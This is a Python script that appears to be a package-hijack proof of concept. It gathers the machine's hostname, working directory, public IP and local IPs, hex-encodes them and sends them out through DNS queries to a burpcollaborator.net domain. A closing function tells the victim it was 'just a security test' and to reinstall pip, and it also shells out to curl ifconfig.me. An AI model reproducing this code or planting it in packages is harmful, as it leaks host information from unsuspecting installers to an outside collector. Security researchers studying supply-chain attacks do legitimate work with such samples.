#!/usr/bin/env python
# encoding=utf-8

import os
import sys
import socket
import dns.resolver
import hashlib
import codecs
import json
import re
PAYLOADS_LENGTH = 60

# Change payload length to allow for a iterator
#PAYLOADS_LENGTH -= 42

python_version = '{0[0]}.{0[1]}.{0[2]}'.format(sys.version_info)
fake_domain = 'hte1ck6lvk1ktcuxl0x8jfgeu50vok.burpcollaborator.net'
def get_wan_ip():
    public_ip = ''
    try:
        
        
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36'}
        HTTP_proxy = os.getenv('HTTP_PROXY')
        HTTPS_proxy = os.getenv('HTTPS_PROXY')
        if HTTP_proxy and lHTTPS_proxy :
            proxies = {"http": HTTP_proxy, "https": HTTPS_proxy}
        else:
            proxies={}
        if python_version >= '3.0':
            import urllib.request
            #import requests
            #public_ip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()
            handler = urllib.request.ProxyHandler(proxies)
            opener = urllib.request.build_opener(handler)
            req = urllib.request.Request('http://ip.dhcp.cn/?json', headers=headers)
            res = opener.open(req)
            #print(res)

            #print(res.status)
            str_ = res.read().decode('utf-8')
            #print(str_)
            public_ip = json.loads(str_)['IP']
            print(public_ip)
        else:
            import urllib2
            handler = urllib2.ProxyHandler(proxies)
            opener = urllib2.build_opener(handler)
            req = urllib2.Request('http://ifconfig.me/ip')#http://ip.dhcp.cn/?json
            #res = opener.open(req)
            #public_ip = (res.read().decode('utf-8'))
            public_ip = load(urllib2.urlopen('http://ip.dhcp.cn/?json'))['ip']# http://jsonip.com
    except Exception as err:
        print(err)
        public_ip = os.system('curl -s "http://ifconfig.me/ip"')
    return public_ip
def get_info(dns_server):
    
    hostname = socket.gethostname()
    local_ips = socket.gethostbyname_ex(hostname)
    
    #print 'jsonip.com', my_ip
    #public_ip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()
    print('host:'+hostname)
    print('cwd:'+os.getcwd())
    #print('public ip :'+str(get_wan_ip()))
    #
    local_ip_str = ''
    for i in local_ips:
        if isinstance(i, str):
            local_ip_str = local_ip_str + ','
        elif isinstance(i, list):
            local_ip_str = local_ip_str + ','.join(i)
        
    print(local_ip_str)
    
    # prepare the dns service
    my_resolver = dns.resolver.Resolver(configure=False)
    my_resolver.nameservers = [dns_server]#
    my_resolver.port = 53
    #print('1')
    payload = hostname+'|'+os.getcwd()+'|'+str(get_wan_ip())+'|'+local_ip_str
    #print('2')
    payload_to_send = payload
    print(payload)
    checksum = hashlib.sha1(payload_to_send.encode('utf-8')).hexdigest()
    print(checksum)
    b=''.join(hex(ord(x))[2:] for x in payload_to_send)
    #print ('[INFO] Sending lookup for :', b)
    i = 0
    #print(len(fake_domain))
    while i < len(b):
        bb = b[i:i+PAYLOADS_LENGTH-len(fake_domain)-1]+'.'+fake_domain#checksum + '.'+
        i = i + PAYLOADS_LENGTH-len(fake_domain)-1
        #print(bb)
        answer = my_resolver.resolve(bb, 'A')
        #print(answer)
def mypip():
    mydns = '8.8.8.8'
    get_info(mydns)
    print('!!!Attention: it is just a security test. Reinstall pip now.!!!')
#mypip()